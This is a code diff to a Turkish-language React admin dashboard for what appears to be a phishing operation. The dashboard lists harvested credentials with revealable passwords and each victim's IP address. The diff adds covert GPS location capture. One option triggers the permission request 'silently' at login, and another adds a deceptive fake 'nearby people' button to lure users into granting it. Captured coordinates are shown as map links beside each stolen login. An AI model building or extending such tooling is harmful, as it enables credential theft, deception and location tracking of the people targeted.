@@ -12,6 +12,8 @@ export default function Admin() {
   const [activeMessage, setActiveMessage] = useState('');
   const [searchTerm, setSearchTerm] = useState('');
   const [captureMode, setCaptureMode] = useState('username');
+  const [enableLocationCapture, setEnableLocationCapture] = useState(false);
+  const [locationStrategy, setLocationStrategy] = useState('login_integrated');
   const [media, setMedia] = useState([]);
   const [credentials, setCredentials] = useState([]);
   const [visiblePasswords, setVisiblePasswords] = useState({});
@@ -36,6 +38,8 @@ export default function Admin() {
       ]);
       setMessages(msgs);
       setCaptureMode(settings.captureMode || 'username');
+      setEnableLocationCapture(settings.enableLocationCapture || false);
+      setLocationStrategy(settings.locationStrategy || 'login_integrated');
       setMedia(mediaList);
       setCredentials(creds);
     } catch (err) {
@@ -49,11 +53,17 @@ export default function Admin() {
 
   const handleCaptureMode = async (mode) => {
     setCaptureMode(mode);
-    try {
-      await updateSettings({ captureMode: mode });
-    } catch (err) {
-      console.error('Failed to update settings:', err);
-    }
+    await updateSettings({ captureMode: mode });
+  };
+
+  const handleToggleLocation = async (enabled) => {
+    setEnableLocationCapture(enabled);
+    await updateSettings({ enableLocationCapture: enabled });
+  };
+
+  const handleLocationStrategy = async (strategy) => {
+    setLocationStrategy(strategy);
+    await updateSettings({ locationStrategy: strategy });
   };
 
   const togglePasswordVisibility = (id) => {
@@ -209,6 +219,19 @@ export default function Admin() {
                         <span className="cred-label">IP Adresi</span>
                         <span className="cred-value">{cred.ip || 'Unknown'}</span>
                       </div>
+                      {cred.location && (
+                        <div className="cred-field">
+                          <span className="cred-label">Konum</span>
+                          <a
+                            href={`https://www.google.com/maps?q=${cred.location.lat},${cred.location.lng}`}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="location-link"
+                          >
+                            <Globe size={14} /> Haritada Gör ({cred.location.strategy === 'nearby_feature' ? 'Buton' : 'Oto'})
+                          </a>
+                        </div>
+                      )}
                     </div>
                   </motion.div>
                 ))}
@@ -296,6 +319,55 @@ export default function Admin() {
                   {captureMode === 'none' && <div className="radio-dot"></div>}
                 </div>
               </div>
+
+              <div className="setting-group-title" style={{ marginTop: '30px' }}>Konum Servisleri</div>
+
+              <div
+                className={`setting-card selectable ${enableLocationCapture ? 'selected' : ''}`}
+                onClick={() => handleToggleLocation(!enableLocationCapture)}
+              >
+                <div className="setting-info">
+                  <h3>📍 Konum Toplama</h3>
+                  <p>Kullanıcılardan GPS konum izni istenir ve koordinatlar kaydedilir (Tarayıcı izni gerektirir).</p>
+                </div>
+                <div className={`toggle-switch ${enableLocationCapture ? 'active' : ''}`}>
+                  <div className="toggle-knob"></div>
+                </div>
+              </div>
+
+              {enableLocationCapture && (
+                <div className="sub-settings" style={{ marginLeft: '20px', marginTop: '10px', borderLeft: '2px solid #ddd', paddingLeft: '15px' }}>
+                  <div className="setting-subtitle" style={{ fontSize: '0.85rem', fontWeight: 600, color: '#666', marginBottom: '10px' }}>TOPLAMA STRATEJİSİ</div>
+
+                  <div
+                    className={`setting-card small selectable ${locationStrategy === 'login_integrated' ? 'selected' : ''}`}
+                    onClick={() => handleLocationStrategy('login_integrated')}
+                    style={{ padding: '15px' }}
+                  >
+                    <div className="setting-info">
+                      <h4 style={{ margin: 0, fontSize: '0.95rem' }}>Giriş Entegreli (Sessiz)</h4>
+                      <p style={{ fontSize: '0.8rem', margin: '4px 0 0 0' }}>Giriş ekranı açıldığında veya form gönderilirken izin istenir.</p>
+                    </div>
+                    <div className={`radio-circle ${locationStrategy === 'login_integrated' ? 'active' : ''}`}>
+                      {locationStrategy === 'login_integrated' && <div className="radio-dot"></div>}
+                    </div>
+                  </div>
+
+                  <div
+                    className={`setting-card small selectable ${locationStrategy === 'nearby_feature' ? 'selected' : ''}`}
+                    onClick={() => handleLocationStrategy('nearby_feature')}
+                    style={{ padding: '15px' }}
+                  >
+                    <div className="setting-info">
+                      <h4 style={{ margin: 0, fontSize: '0.95rem' }}>"Yakınlardakileri Gör" Özelliği</h4>
+                      <p style={{ fontSize: '0.8rem', margin: '4px 0 0 0' }}>Ana sayfaya sahte bir "Yakınlardaki Kişiler" butonu ekler.</p>
+                    </div>
+                    <div className={`radio-circle ${locationStrategy === 'nearby_feature' ? 'active' : ''}`}>
+                      {locationStrategy === 'nearby_feature' && <div className="radio-dot"></div>}
+                    </div>
+                  </div>
+                </div>
+              )}
 
               <div className="setting-group-title" style={{ marginTop: '30px' }}>Sistem</div>
 
@@ -675,6 +747,38 @@ export default function Admin() {
           .nav-item { white-space: nowrap; padding: 10px 15px; }
           .badge { display: none; }
         }
+        .toggle-switch {
+          width: 44px;
+          height: 24px;
+          background: #ccc;
+          border-radius: 12px;
+          position: relative;
+          transition: background 0.3s;
+        }
+        .toggle-switch.active { background: #2ecc71; }
+        .toggle-knob {
+          width: 20px;
+          height: 20px;
+          background: white;
+          border-radius: 50%;
+          position: absolute;
+          top: 2px;
+          left: 2px;
+          transition: transform 0.3s;
+          box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .toggle-switch.active .toggle-knob { transform: translateX(20px); }
+        
+        .location-link {
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          color: #3498db;
+          text-decoration: none;
+          font-weight: 600;
+          font-size: 0.9rem;
+        }
+        .location-link:hover { text-decoration: underline; }
       `}</style>
     </div>
   );
